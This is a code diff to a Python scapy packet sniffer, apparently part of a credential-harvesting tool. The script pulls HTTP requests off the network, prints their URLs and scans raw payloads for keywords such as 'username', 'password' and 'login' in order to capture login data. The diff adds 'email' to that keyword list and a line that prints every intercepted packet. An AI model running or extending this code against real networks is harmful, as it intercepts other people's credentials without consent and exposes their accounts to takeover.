@@ -16,7 +16,7 @@ def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         packet.show()
         load = str(packet[scapy.Raw].load)
-        keywords = ["username", "uname", "user", "login", "password", "pass"]
+        keywords = ["username", "uname", "user", "login", "password", "email", "pass"]
         for keyword in keywords:
             if keyword in load:
                 return load
@@ -24,6 +24,7 @@ def get_login_info(packet):
 
 def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
+        print(packet.show())
         url = get_url(packet)
         print("[+] HTTP Request >> " + url.decode())
         login_info = get_login_info(packet)
